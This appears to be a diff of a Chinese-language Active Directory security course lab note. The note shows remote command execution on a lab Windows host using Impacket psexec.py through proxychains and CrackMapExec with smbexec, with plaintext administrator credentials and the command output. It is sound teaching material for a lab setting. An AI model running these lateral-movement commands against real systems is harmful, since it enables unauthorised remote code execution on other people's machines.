@@ -17,8 +17,7 @@ Lecture Video: [ 2022/05/11 AD 安全 2 ](https://youtu.be/ubNMQ7_dcm0?si=26g2Lz
     > python撰寫的內網滲透工具
 
 ## Lab
-
-### ==遠端執行(RDP)2==
+### 遠端執行(RDP)2
 * Kali-Linux Tools
     * Impacket(Kali-Linux愛好者可使用的PsExec)
         ```bash
@@ -38,12 +37,12 @@ Lecture Video: [ 2022/05/11 AD 安全 2 ](https://youtu.be/ubNMQ7_dcm0?si=26g2Lz
         $ crackmapexec smb [IP] -u <username> -p <password --exec-method smbexec -x '<command>'
         ```
         exec-method支援以下方法:
-            * mmcexec
-            * smbexec
-            * wmiexec
-            * atexec
+        * mmcexec
+        * smbexec
+        * wmiexec
+        * atexec
 
-#### ==How to use Impacket==
+#### How to use Impacket
 感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具
 ```bash
 $ proxychains psexec.py kuma\administrators:1qaz@WSX3edc@192.168.222.129 dir
@@ -57,9 +56,9 @@ Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra
 [-] [Errno Connection error (192.168.222.129:445)] [Errno 111] Connection refused
 ```
 
-#### ==How to use CrackMapExec==
+#### How to use CrackMapExec
 還記的之前的Lab([NTUSTISC - AD Note - Lab(Password Spraying)]({{base.url}}/NTUSTISC-AD-Note-Lab(0x14Password-Spraying)/))，有使用過這套工具，當時是為了做密碼揮灑的目的，不過考慮到psexec這個工具本質上就是爬到遠端的主機，然後開execve的process，並且跟他溝通，所以在這樣的前提下，就可以直接用CrackMapExec達到和psexec一樣的效果，畢竟兩者本質是做的事情差不多
-:::spoiler Execution Result
+
 ```bash
 $  crackmapexec smb 192.168.222.129 -u administrator -p 1qaz@WSX3edc --exec-method smbexec -x 'dir C:\tools'
 SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
@@ -97,6 +96,3 @@ SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/06  ñWñ╚ 11:12  
 SMB         192.168.222.129 445    DESKTOP-G95U93T  8 ¡╙└╔«╫       3,686,600 ª∞ñ╕▓╒
 SMB         192.168.222.129 445    DESKTOP-G95U93T  16 ¡╙Ñ╪┐²  16,192,659,456 ª∞ñ╕▓╒ÑiÑ╬
 ```
-:::
-
-## Reference
